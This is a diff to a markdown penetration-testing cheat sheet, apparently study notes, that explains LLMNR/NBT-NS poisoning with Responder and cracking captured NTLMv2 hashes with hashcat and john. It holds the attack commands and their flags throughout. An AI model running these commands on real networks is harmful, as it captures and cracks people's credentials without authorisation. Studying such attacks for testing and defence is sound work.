@@ -17,6 +17,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 # STEP 3b — If Hashcat OpenCL broken
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+> `-I ens224` sets the listening interface (change to match your interface). `-w` runs a fake Web Proxy Auto-Discovery (WPAD) server. `-f` fingerprints the OS. Mode `5600` is NTLMv2. Use `john` as a backup if Hashcat fails due to OpenCL driver issues.
 
 ---
 
@@ -31,13 +32,13 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 ## How It Works
 
-1. Host tries to reach `\\printer01` — DNS doesn't know it
-2. Host **broadcasts**: "anyone know this host?"
-3. **Responder responds** pretending to be that host
-4. Victim sends auth request containing their **NTLMv2 hash**
-5. Crack offline → cleartext password → domain foothold
+1. A host tries to reach `\\printer01`. DNS does not know that name.
+2. The host **broadcasts** on the local network: "does anyone know this host?"
+3. **Responder answers** that broadcast, pretending to be that host.
+4. The victim machine sends an authentication request. That request contains the user's **NTLMv2 hash**.
+5. You crack the hash offline to get the cleartext password. Now you have a domain foothold.
 
-**Key ports:** LLMNR = UDP 5355 | NBT-NS = UDP 137
+**Key ports:** Link-Local Multicast Name Resolution (LLMNR) = UDP 5355 | NetBIOS Name Service (NBT-NS) = UDP 137
 
 ---
 
@@ -48,6 +49,7 @@ sudo responder -I ens224          # basic active poisoning
 sudo responder -I ens224 -wf      # + WPAD proxy + OS fingerprinting
 sudo responder -I ens224 -A       # analyze only — no poisoning (passive)
 ```
+> First line: active poisoning only. Second line: also catches browser auth via WPAD and logs OS info. Third line: safe passive mode — just observe, never respond.
 
 | Flag | Effect |
 |------|--------|
@@ -71,6 +73,7 @@ sudo responder -I ens224 -A       # analyze only — no poisoning (passive)
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt   # NTLMv2
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt    # fallback
 ```
+> Mode `5600` is NTLMv2 in Hashcat. John auto-detects the format. Use John if Hashcat throws an OpenCL error on virtual machines.
 
 | Hash Type | Hashcat Mode |
 |-----------|-------------|
